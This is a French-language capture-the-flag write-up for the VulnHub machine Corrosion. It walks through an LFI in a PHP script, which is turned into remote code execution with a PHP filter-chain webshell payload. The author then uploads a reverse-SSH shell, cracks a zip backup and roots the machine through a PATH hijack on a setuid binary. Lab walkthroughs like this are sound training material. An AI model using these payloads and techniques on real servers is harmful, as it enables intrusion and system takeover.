# Solution du CTF Corrosion de VulnHub

Nitro
-----

Après avoir résolu [le second opus](https://devloop.users.sourceforge.net/index.php?article235/solution-du-ctf-corrosion-2-de-vulnhub) il y a presque 1 an de cela, je me suis jeté sur ce CTF en piochant un peu au hasard sur VulnHub.  

Le cheminement attendu de l'attaque est des plus classique avec une injection de code PHP dans un fichier de log mais j'ai volontairement bifurqué vers une nouvelle technique d'exploitation des failles d'inclusion locale (LFI) que je considère comme un vrai game-changer et que je pense bien intégrer prochainement dans [Wapiti](https://wapiti-scanner.github.io/) :)  

Allez, c'est parti !  

```plain
$ sudo nmap -sCV -T5 -p- 192.168.56.38
Starting Nmap 7.93 ( https://nmap.org ) at 2022-10-27 17:06 CEST
Nmap scan report for 192.168.56.38
Host is up (0.00017s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Ubuntu 5ubuntu1 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 0ca71c8b4e856b168cfdb7cd5f603ea4 (RSA)
|   256 0f24f465af50d3d3aa0933c3173d63c7 (ECDSA)
|_  256 b0facd7773dae47dc875a1c55f2c210a (ED25519)
80/tcp open  http    Apache httpd 2.4.46 ((Ubuntu))
|_http-title: Apache2 Ubuntu Default Page: It works
|_http-server-header: Apache/2.4.46 (Ubuntu)
MAC Address: 08:00:27:CE:E1:62 (Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Scénario on ne plus classique qui laisse présager d'une exploitation web pour avancer. Le site servant une page de défaut, il faut recourir à un outil comme [FeroxBuster](https://github.com/epi052/feroxbuster#readme) pour déceler la présence de dossiers et fichiers sur le serveur.  

L'un des fichiers découverts est le fichier */tasks/tasks\_todo.txt* qui contient les notes suivantes :  

> # Tasks that need to be completed  
> 
>   
> 
> 1. Change permissions for auth log  
> 
> 2. Change port 22 -> 7672  
> 
> 3. Set up phpMyAdmin

L'autre fichier est un script trouvé une fois de plus via recherche puis affiché via un listing Apache : */blog-post/archives/randylogs.php  

Tous ces messages subliminaux autour des logs semblent insister sur la possibilité d'inclure un fichier de log (à tout hasard */var/**log/auth.log) et comme on ne dispose que de ce script PHP il semble prédisposé à être vulnérable.  

Je tente de lui passer différents noms de paramètres bien connus et au second j'obtiens bien un directory traversal avec l'URL suivante :  

```plain
http://192.168.56.38/blog-post/archives/randylogs.php?file=/un/path/quelconque
```

Kansas City Shuffle
-------------------

La technique que j'ai utilisé à la place de la simple injection dans le fichier de log semble avoir été d'abord publiée [sur Gist par un certain loknop](https://gist.github.com/loknop/b27422d355ea1fd0d90d6dbc1e278d4d) sans tambours ni trompettes ce qui semble bien dommage.  

L'équipe *Synacktiv* a depuis publié [un outil plus avancé](https://github.com/synacktiv/php_filter_chain_generator) pour profiter de cette technique qui permet de transformer directement une LFI en RCE (remote code execution) sans se baser sur la présence du moindre fichier sur la cible.  

Tout repose sur les différents *filtres* sur les flux dont PHP dispose. On connait ainsi le filtre base64 qui peux permettre de convertir une LFI en simple directory traversal et ainsi récupérer le code source de fichiers PHP existant sur un serveur.  

Il y a aussi d'autres wrappers bien connus (comme *php://self*) dans les techniques d'exploitation.  

Ici tout se base sur les filtres de conversion entre encodage de caractères et le fait que certains encodages disposent d'un entête (comme le fameux BOM sur UTF-8) composé de caractères improbables mais qui une fois passé dans un autre encodage génère un caractère ASCII qui peut nous être utile.  

Ces opérations ne donnent pas le caractère espéré aussi proprement qu'on peut le souhaiter, heureusement, bingo ! En encodant et décodant aussitôt en base64 PHP fait le ménage en retirant les caractères exotiques.  

Au final en alignant des conversions d'encodage partant de nul part on peut générer une suite ASCII suffisants pour matcher l'alphabet du base64 et à la fin décoder le payload base64 et le faire exécuter.  

L'exemple pris dans le document original c'est la conversion UTF-8 vers [ISO-2022-KR](https://en.wikipedia.org/wiki/ISO/IEC_2022), un vieil encodage créé en 1993. Ce dernier place un entête constitué des caractères suivants :  

```plain
\x1b$)C
```

Une fois appliqué les deux passes base64 on obtient simplement le caractère *C*. Il faut aussi effectuer un codage de UTF-8 vers UTF-7 qui va supprimer les caractères égal (*=)* qui terminent souvent les chaines base64 (padding).  

En enchaînant ensuite différents gadgets d'un encodage vers un autre (pas toujours les même mais souvent des méconnus) on peut intégrer tel puis tel caractère. Le tout se fait en marche inverse puisque les encodages rajoutent les données en début de chaîne.  

Dans la pratique je peux générer mon payload de cette façon :  

```bash
python3 php_filter_chain_generator.py --chain '<?php system($_GET["c"]); ?>'
```

Et l'intégrer dans l'URL qui ressemblera à ceci :  

```plain
http://192.168.56.38/blog-post/archives/randylogs.php?file=php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|--- snip ---|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp&c=id
```

Je vous fait grâce de l'URL complète longue de 5860 octets. Heureusement suffisamment courte pour être acceptée par le serveur web.  

Après upload et exécution de [reverse-ssh](https://github.com/Fahrj/reverse-ssh) il est temps de fouiller un peu sur le système.  

On my way
---------

Je m'intéresse aussitôt à l'utilisateur *randy*, seul rempart visible avant *root*. Cet utilisateur n'a toutefois aucun dossier ni fichier world-readable...  

Dans les logs je retrouve effectivement le auth.log qui était lisible mais dont je n'ai pas eu besoin   

```plain
www-data@corrosion:/home$ find /var/log/ -type f -readable 2>/dev/null 
/var/log/alternatives.log
/var/log/wtmp
/var/log/bootstrap.log
/var/log/auth.log.1
/var/log/faillog
/var/log/fontconfig.log
/var/log/auth.log
/var/log/dpkg.log
/var/log/installer/telemetry
/var/log/installer/media-info
/var/log/installer/initial-status.gz
/var/log/gpu-manager.log
/var/log/lastlog
/var/log/apt/eipp.log.xz
/var/log/apt/history.log.1.gz
/var/log/apt/history.log
/var/log/dpkg.log.1
/var/log/alternatives.log.1
```

Les processus, les ports en écoute ou encore les binaires setuid n'ont rien qui sort de l'ordinaire... Je décide de sortir un [LinPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS) histoire d'automatiser l'énumération.  

Ce dernier indique que le système est potentiellement vulnérable à la faille Sudo Baron Samedit (devenue un running gag des CTFs) mais surtout retrouve une archive intéressante dans */var/backups/* :  

```plain
www-data@corrosion:/tmp$ unzip -l /var/backups/user_backup.zip
Archive:  /var/backups/user_backup.zip
  Length      Date    Time    Name
---------  ---------- -----   ----
     2590  2021-07-30 00:20   id_rsa
      563  2021-07-30 00:20   id_rsa.pub
       23  2021-07-30 00:21   my_password.txt
      148  2021-07-30 00:11   easysysinfo.c
---------                     -------
     3324                     4 files
```

L'archive étant protégée par mot de passe il faut passer par zip2john puis JtR pour obtenir le password (*!randybaby*). Le fichier texte dans l'archive contient lui même le mot de passe SSH de l'utiisateur randy (*randylovesgoldfish1998*)  

Musique classique
-----------------

L'accès permet la récupération du premier flag (98342721012390839081). Là on remarque que l'on peut exécuter un binaire avec les droits de l'utilisateur root :  

```plain
randy@corrosion:~$ sudo -l
[sudo] password for randy: 
Matching Defaults entries for randy on corrosion:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User randy may run the following commands on corrosion:
    (root) PASSWD: /home/randy/tools/easysysinfo
```

On dispose du code source puisqu'il était lui aussi présent dans l'archive :  

```c
#include<unistd.h>
void main()
{ setuid(0);
  setgid(0);
  system("/usr/bin/date");

  system("cat /etc/hosts");

  system("/usr/bin/uname -a");

}
```

Cela ressemble à une faille de PATH classique car le programme *cat* est appelé sans chemin absolu toutefois ce n'est normalement pas exploitable via sudo qui ne préserve pas l'environnement par défaut.  

Il s'avère en fait que le binaire est aussi setuid root par conséquent l'exploitation est possible directement.  

```plain
randy@corrosion:~/tools$ export PATH=/home/randy/tools:$PATH
randy@corrosion:~/tools$ vi /etc/hosts
randy@corrosion:~/tools$ cp /bin/bash cat
randy@corrosion:~/tools$ ./easysysinfo
Thu Oct 27 12:42:40 PM MDT 2022
root@corrosion:~/tools# id
uid=0(root) gid=0(root) groups=0(root),4(adm),24(cdrom),30(dip),46(plugdev),121(lpadmin),133(sambashare),1000(randy)

root@corrosion:/root# cat root.txt 
FLAG: 4NJSA99SD7922197D7S90PLAWE 

Congrats! Hope you enjoyed my first machine posted on VulnHub! 
Ping me on twitter @proxyprgrammer for any suggestions.

Youtube: https://www.youtube.com/c/ProxyProgrammer
Twitter: https://twitter.com/proxyprgrammer
```

Dans la crontab de root on peut faire l'entrée qui fixait les permissions laxistes sur le fichier de log :  

```plain
root@corrosion:/root# crontab -l
# m h  dom mon dow   command

* * * * * chmod 775 -R /var/log/auth.log && echo 'Complete!' > /root/logs.txt
```


*Published October 27 2022 at 23:24*